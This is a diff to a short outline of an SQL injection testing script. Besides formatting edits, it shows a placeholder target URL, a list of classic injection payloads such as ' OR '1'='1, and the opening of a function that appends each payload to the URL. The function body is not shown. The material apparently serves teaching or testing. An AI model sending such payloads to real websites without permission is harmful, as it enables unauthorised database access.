@@ -1,13 +1,14 @@
-=============================================
+===========================================
 <BR>
                SQL INJECTION
 <BR>
-=============================================
+===========================================
 Define the URL of the target website:
 <br>
 url = "http://example.com/vulnerable_page.php"
 
 Define a list of SQL injection payloads to test:
+<br>
 payloads = [
     "' OR '1'='1",
     "' OR '1'='1' -- ",
@@ -22,6 +23,7 @@ payloads = [
 ]
 
 Define a function to test for SQL injection:
+<br>
 def test_sql_injection(url, payloads):
     for payload in payloads:
         # Construct the full URL with the payload
